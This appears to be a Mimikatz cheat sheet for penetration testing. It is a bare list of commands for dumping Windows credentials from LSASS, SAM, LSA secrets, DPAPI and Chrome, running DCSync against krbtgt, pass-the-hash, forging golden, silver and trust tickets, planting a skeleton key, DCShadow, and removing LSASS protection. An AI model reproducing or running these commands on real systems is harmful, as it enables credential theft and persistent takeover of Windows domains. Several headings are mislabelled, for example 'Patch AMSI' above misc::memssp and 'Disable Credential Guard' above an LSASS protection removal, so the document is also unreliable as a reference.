```
# Start Mimikatz
mimikatz.exe
.\mimikatz.exe

# Enable Debug Privileges
privilege::debug

# Token Elevation
token::elevate

# Basic Information
version
hostname
coffee

# Logon Passwords
sekurlsa::logonpasswords
sekurlsa::logonpasswords full

# WDigest Credentials
sekurlsa::wdigest

# Kerberos Credentials
sekurlsa::kerberos

# TSPKG Credentials
sekurlsa::tspkg

# Live SSP Credentials
sekurlsa::livessp

# SSP Credentials
sekurlsa::ssp

# Credman Credentials
sekurlsa::credman

# DPAPI Secrets
sekurlsa::dpapi

# Ekeys
sekurlsa::ekeys

# Dump SAM Hashes
lsadump::sam

# Dump LSA Secrets
lsadump::secrets

# Dump Cached Credentials
lsadump::cache

# Dump Domain Cached Credentials
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator

# DCSync Specific User
lsadump::dcsync /domain:DOMAIN.LOCAL /user:user

# Dump KRBTGT Hash
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:cmd.exe

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# List Kerberos Tickets
kerberos::list

# Export Kerberos Tickets
kerberos::list /export

# Golden Ticket
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXX /krbtgt:NTHASH /id:500 /ptt

# Silver Ticket
kerberos::golden /user:user /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXX /target:SERVER.DOMAIN.LOCAL /service:cifs /rc4:NTHASH /ptt

# Skeleton Key
misc::skeleton

# Trust Tickets
kerberos::golden /domain:DOMAIN.LOCAL /sid:S-1-5-21-XXX /sids:S-1-5-21-YYY-519 /rc4:NTHASH /user:Administrator /ptt

# Purge Kerberos Tickets
kerberos::purge

# Inject Ticket
kerberos::ptt ticket.kirbi

# Export Certificates
crypto::certificates /export

# DPAPI Masterkeys
dpapi::masterkey

# Chrome Passwords
dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# WiFi Passwords
vault::list
vault::cred

# Enumerate Vault Credentials
vault::list
vault::cred /patch

# Dump LSASS Minidump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Process List
process::list

# Process Protect
process::protect /process:lsass.exe

# Enumerate Privileges
privilege::debug
token::whoami

# Enumerate SID
sid::lookup DOMAIN\user

# Enumerate Sessions
ts::sessions

# Enumerate Remote Sessions
ts::remote /target:SERVER

# Enumerate RDP Credentials
ts::multirdp

# Enable WDigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Disable Credential Guard
!+
!processprotect /process:lsass.exe /remove

# Patch AMSI
misc::memssp

# Dump Certificates
crypto::capi
crypto::cng

# Export Tickets
sekurlsa::tickets /export

# Kerberoast
kerberos::ask /target:HTTP/server.domain.local

# Enumerate Domain Controllers
lsadump::dcshadow /object:user

# DCShadow
lsadump::dcshadow /push

# Enumerate Trusts
lsadump::trust /patch

# Dump Backup Keys
lsadump::backupkeys

# Command Prompt as SYSTEM
token::elevate
misc::cmd

# PowerShell as SYSTEM
token::elevate
misc::powershell

# Load Kiwi in Meterpreter
load kiwi

# Kiwi Commands
creds_all
lsa_dump_sam
lsa_dump_secrets
dcsync_ntlm krbtgt

# Common OSCP Commands
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTHASH /run:cmd.exe
kerberos::list
kerberos::ptt ticket.kirbi
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
```
